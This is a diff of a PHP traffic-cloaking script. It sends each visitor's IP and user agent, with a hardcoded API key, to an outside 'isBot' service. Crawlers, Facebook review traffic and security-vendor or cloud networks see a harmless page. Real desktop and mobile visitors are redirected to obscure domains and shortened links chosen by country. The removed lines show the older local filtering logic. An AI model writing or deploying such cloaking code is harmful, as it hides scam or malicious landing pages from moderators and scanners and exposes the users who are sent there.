@@ -34,7 +34,7 @@
 
   function getApi(){
     $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, 'http://redirect100.info/api/ip/'.getUserIP());
+    curl_setopt($ch, CURLOPT_URL, 'http://redirect100.info/api/isBot?api_key=51fa5653d1986420acfc567f4a9826ac&i='.getUserIP().'&u='.$_SERVER["HTTP_USER_AGENT"]);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
     curl_setopt($ch, CURLOPT_TIMEOUT, 5);
     $org = curl_exec($ch);
@@ -44,95 +44,18 @@
 
   $user = getApi();
 
-  $action = 'theme';
 
-  require_once('Mobile_Detect.php');
-  require_once('Browser.php');
-  $detect = new Mobile_Detect;
-  $browser = new Browser();
-
-  if($detect->isMobile() || $browser->isMobile()){
-    $action = 'mobile';
-  }else if($browser->getBrowser() == Browser::BROWSER_GOOGLEBOT) {
-    $action = 'theme';
-  }else if($browser->getPlatform() == Browser::PLATFORM_X11 || $browser->isFacebook()){
-    $action = 'theme';
-  }else if($browser->getBrowser() == Browser::BROWSER_CHROME){
-    $action = 'site';
-  }
-
-  $_SERVER["HTTP_USER_AGENT"] = isset($_SERVER["HTTP_USER_AGENT"]) ? $_SERVER["HTTP_USER_AGENT"] : "";
-
-  if(strpos($_SERVER["HTTP_USER_AGENT"], "Googlebot") !== false){
-    $action = 'theme';
-  }
-
-  if($action == 'site'){
-    $_SERVER['HTTP_REFERER'] = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
-    $refs = array('facebook.com', 'herokuapp.com');
-    $action = 'theme';
-    foreach ($refs as $ref) {
-      if(strpos($_SERVER['HTTP_REFERER'], $ref) !== false){
-        $action = 'site';
-        break;
-      }
-    }
-  }
-
-  if($action == 'site'){
-    $asnlist = array('facebook','google','linode','kaspersy','mcafee','amazon','microsoft corporation');
-  }else if($action == 'mobile'){
-    $asnlist = array('facebook','linode','kaspersy','mcafee','amazon','microsoft corporation');
-  }
-
-
-  if($action != 'theme'){
-    $org = $user->isp;
-    foreach ($asnlist as $asn) {
-      if(strpos(strtolower($org), strtolower($asn)) !== false){
-        $action = 'theme';
-        break;
-      }
-    }
-  }
-
-  if($action != 'theme'){
-    $_SERVER['HTTP_REFERER'] = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
-    $bannedrefs = array('facebook.com/lsr.php');
-    foreach ($bannedrefs as $ref) {
-      if(strpos($_SERVER['HTTP_REFERER'], $ref) !== false){
-        $action = 'theme';
-        break;
-      }
-    }
-  }
-
-  if(isset($_SERVER['HTTP_X_FB_CURL_CLIENT'])){
-    $action = 'theme';
-  }
-
-  if(isset($_SERVER['REQUEST_METHOD']) && $_SERVER['REQUEST_METHOD'] != 'GET'){
-    $action = 'theme';
-  }
-
-  $id = @$_SERVER["REQUEST_URI"];
-  if(empty($id) || $id == "" || $id == "/"){
-    $id = generate_name(rand(5,10));
-  }
-  $id = isset(explode("/", $id)[1]) ? explode("/", $id)[1] : $id;
-  $id = isset(explode(".", $id)[0]) ? explode(".", $id)[0] : $id;
-
-  if($action == 'mobile'){
-    if ($user->countryCode == "TR") {
+  if ($user->status == true && $user->type == "DES") {
+    header("Location: http://xkkdiqis.info/");
+    exit;
+  } else if ($user->status == true && $user->type == "MOB") {
+    if ($user->country_code == "TR") {
       header('Location: https://goo.gl/O3CLpb');
     } else {
       header('Location: https://goo.gl/2lJlph');
     }
     exit;
-  }else if($action == 'site'){
-    header("Location: http://xkkdiqis.info/$id.jpg");
-    exit;
-  }else{
+  } else {
     @ob_end_clean();
     @ob_end_flush();
     //header("HTTP/1.1 301");
